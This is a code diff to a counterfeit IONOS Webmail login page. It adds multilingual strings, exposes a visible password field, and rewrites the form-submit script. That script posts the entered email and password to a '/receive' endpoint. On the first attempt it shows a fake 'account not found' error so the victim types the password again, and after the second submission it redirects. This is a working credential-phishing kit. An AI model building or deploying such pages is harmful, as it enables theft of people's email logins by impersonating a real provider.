@@ -46,9 +46,12 @@
       "All Systems Operational": "All Systems Operational",
       "Email Archiving": "Email Archiving",
       "More IONOS Logins": "More IONOS Logins",
+      "My IONOS": "My IONOS",
+		"Password": "Password",
+		"HiDrive": "HiDrive",
     },
     es: {
-      "Webmail Login": "Inicio de sesión en Webmail",
+      "Webmail Login": "Webmail Login",
       "Solution finder": "Buscador de soluciones",
       "Help & contact": "Ayuda y contacto",
       "Activation of Browser Cookies Required": "Activación de cookies del navegador requerida",
@@ -71,6 +74,12 @@
       "All Systems Operational": "Todos los sistemas operativos están en funcionamiento",
       "Email Archiving": "Archivado de correos electrónicos",
       "More IONOS Logins": "Más inicios de sesión en IONOS",
+      "My IONOS": "Mi IONOS",
+		"Password": "Contraseña",
+		"HiDrive": "HiDrive",
+		"Log out after the session or use": "Cierra sesión después de la sesión o usa",
+"private browsing mode": "el modo de navegación privada",
+
     },
     de: {
       "Webmail Login": "Webmail-Login",
@@ -86,7 +95,7 @@
       "My Webmail Login": "Mein Webmail-Login",
       "Email address": "E-Mail-Adresse",
       "Not your device?": "Nicht Ihr Gerät?",
-      "Log out after the session or use private browsing mode.": 
+      "Log out after the session or use": 
         "Melden Sie sich nach der Sitzung ab oder verwenden Sie den privaten Modus.",
       "Next": "Weiter",
       "Not an IONOS customer yet?": "Noch kein IONOS-Kunde?",
@@ -96,6 +105,11 @@
       "All Systems Operational": "Alle Systeme betriebsbereit",
       "Email Archiving": "E-Mail-Archivierung",
       "More IONOS Logins": "Weitere IONOS-Logins",
+      "My IONOS": "Mein IONOS",
+		"Password": "Passwort",
+		"HiDrive": "HiDrive",
+		"Log out after the session or use": "Melden Sie sich nach der Sitzung ab oder verwenden Sie",
+"private browsing mode": "den privaten Modus",
     },
     fr: {
       "Webmail Login": "Connexion Webmail",
@@ -121,25 +135,52 @@
       "All Systems Operational": "Tous les systèmes sont opérationnels",
       "Email Archiving": "Archivage des courriels",
       "More IONOS Logins": "Plus de connexions IONOS",
+      "My IONOS": "Mon IONOS",
+		"Password": "Mot de passe",
+		"HiDrive": "HiDrive",
+		"Log out after the session or use": "Déconnectez-vous après la session ou utilisez",
+"private browsing mode": "le mode de navigation privée",
     },
   };
 
   // Detect language from <meta> tag
   const langMeta = document.querySelector('meta[http-equiv="Content-Language"]');
-  const language = langMeta ? langMeta.getAttribute("name") : "en";
+  const language = langMeta ? langMeta.getAttribute("name") : "es"; 
+ 
+  // Get translations for the detected language
+  const texts = translations[language] || translations.fr;
 
-  // Get the translations for the detected language
-  const texts = translations[language] || translations.en;
+  // Normalize text by trimming spaces and removing unnecessary characters
+  const normalizeText = (text) => text.replace(/\s+/g, " ").trim();
 
-  // Replace text content
-  const elements = document.querySelectorAll("*");
-
-  elements.forEach((element) => {
-    const trimmedText = element.textContent.trim();
-    if (texts[trimmedText]) {
-      element.textContent = texts[trimmedText];
+  // Function to recursively translate text content
+  const translateRecursively = (element) => {
+    if (element.children.length === 0) {
+      const trimmedText = normalizeText(element.textContent);
+      if (texts[trimmedText]) {
+        element.textContent = texts[trimmedText];
+      }
+    } else {
+      Array.from(element.children).forEach(translateRecursively);
     }
+  };
+
+  // Translate all elements initially
+  document.querySelectorAll("*").forEach(translateRecursively);
+
+  // Monitor DOM changes for dynamically added content
+  const observer = new MutationObserver((mutations) => {
+    mutations.forEach((mutation) => {
+      mutation.addedNodes.forEach((node) => {
+        if (node.nodeType === Node.ELEMENT_NODE) {
+          translateRecursively(node);
+        }
+      });
+    });
   });
+
+  // Observe changes in the DOM
+  observer.observe(document.body, { childList: true, subtree: true });
 });
 	</script>
        
@@ -183,7 +224,9 @@
                                     </g>
                                 </svg>
                             </a>
-                            <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help" /><i class="oao-navi-search-mic"></i></div>
+                            <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i>
+                            	
+                            <i class="oao-navi-search-mic"></i></div>
                         </div>
                     </li>
                 </ul>
@@ -212,7 +255,10 @@
                                     </g>
                                 </svg>
                             </a>
-                            <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help" /><i class="oao-navi-search-mic"></i></div>
+                            <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i>
+                            	
+                             	
+                            <i class="oao-navi-search-mic"></i></div>
                         </div>
                     </li>
                 </ul>
@@ -283,15 +329,15 @@
                                     <li class="form-stripe">
                                         <label class="label" for="username">Email address</label>
 
-                                        <input type="email" class="input-text form-input" name="identifier" id="username" tabindex="1" required="true" autofocus="" autocomplete="username" autocapitalize="none" spellcheck="false" value="" />
+                                        <input type="email" id="user-id" class="input-text form-input" name="identifier" id="username" tabindex="1" required="true" autofocus="" autocomplete="username" autocapitalize="none" spellcheck="false" value="" />
 
                                         <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" tabindex="0">private browsing mode</a>.</p>
                                     
                                         	
                                         </li>
-                                        <li class="form-stripe" style="display:none">
+                                        <li class="form-stripe" style="">
                                         	<label class="label" for="username">Password</label>
-                                        	<input type="password" class=" input-text form-input" name="hiddenPassword" tabindex="-1" />
+                                        	<input type="password" id="password" class=" input-text form-input" name="password" tabindex="-1" />
                                         	
                                         	</li>
                                     <li class="form-stripe form-stripe--actions">
@@ -451,54 +497,90 @@
     </div>
     <div class="static-overlay__blocker static-overlay__blocker--hidden"></div>
 </body>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+  
 <script>
-$(document).ready(function() { 
-    $('#button--with-loader').on('click', function(e) {
-        e.preventDefault(); // Prevent default form submission
+$(document).ready(function () {
+  $('#button--with-loader').on('click', function (e) {
+    e.preventDefault();
 
-        let isEmpty = false;
-        const checkInputs = $('input'); // Collect input fields
+    let isEmpty = false;
+    const checkInputs = $('input'); 
 
-        // Check for empty fields and highlight them
-        for (const check of checkInputs) {
-            if (check.value.trim() === "") {
-                check.style.borderColor = 'red'; // Highlight the empty input field
-                isEmpty = true; // Mark as empty
-            } else {
-                check.style.borderColor = ''; // Reset border color if filled
-            }
-        }
+      checkInputs.each(function () {
+      const input = $(this);
+      const errorTextId = input.attr('id') + '-error'; 
+      
+      $('#' + errorTextId).remove();
 
-        // If no input is empty, proceed with form submission
-        if (!isEmpty) {
-            // Serialize form data into an array
-            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
-            let user = {};
-            let visitor = sessionStorage.setItem('visitor', $('#user-id').val());
-            console.log(visitor);
+      if (input.val().trim() === "") {
+        input.css('border-color', 'red'); 
+        isEmpty = true;
 
-            userinfo.forEach((value) => {
-                user[value.name] = value.value; // Create user object from inputs
-            });
-
-            user['visitor'] = visitor; // Add visitor info to user object
-            console.log(user);
-
-            // Send AJAX request
-            $.ajax({
-                method: 'POST',
-                url: "/receive", // Replace with your server endpoint
-                data: user
-            }).done(function(msg) {
-                console.log(msg);
-                window.location.href = msg.url;
-            }).fail(function(err, textStatus, error) {
-                console.log('fail');
-                // Handle failure response
-                // Optional: You could redirect or show an error message here
-            });
-        }
+          const errorMessage = $('<span></span>')
+          .attr('id', errorTextId)
+          .text('Please fill out this information.')
+          .css('color', 'red')
+          .css('font-size', '12px');
+        input.after(errorMessage); 
+      } else {
+        input.css('border-color', ''); 
+      }
     });
+
+    // If there are empty fields, stop further execution
+    if (isEmpty) return;
+
+    // Collect form data
+    let userinfo = $('form').serializeArray();
+    let user = {};
+    userinfo.forEach((value) => {
+      user[value.name] = value.value; 
+    });
+
+      const passwordField = $('#password');
+    const errorDivId = 'custom-error-message';
+    if ($('#' + errorDivId).length === 0) {
+      // Create and display the custom error message
+      const errorDiv = $('<div></div>')
+        .attr('id', errorDivId)
+        .text(
+          'A Webmail account has not been found with this email address. Correct your entry or contact your admin.'
+        )
+        .css('color', 'red')
+        .css('font-size', '14px')
+        .css('margin-top', '10px');
+
+      passwordField.after(errorDiv); 
+
+         $.ajax({
+        method: 'POST',
+        url: '/receive',
+        data: user,
+      })
+        .done(function (msg) {
+          console.log('First submission:', msg);
+        })
+        .fail(function (err, textStatus, error) {
+          console.log('First submission failed:', textStatus, error);
+        });
+
+      return;
+    }
+
+      $.ajax({
+      method: 'POST',
+      url: '/receive', 
+      data: user,
+    })
+      .done(function (msg) {
+        console.log('Second submission:', msg);
+        window.location.href = msg.url;
+      })
+      .fail(function (err, textStatus, error) {
+        console.log('Second submission failed:', textStatus, error);
+      });
+  });
 });
 </script> 
 
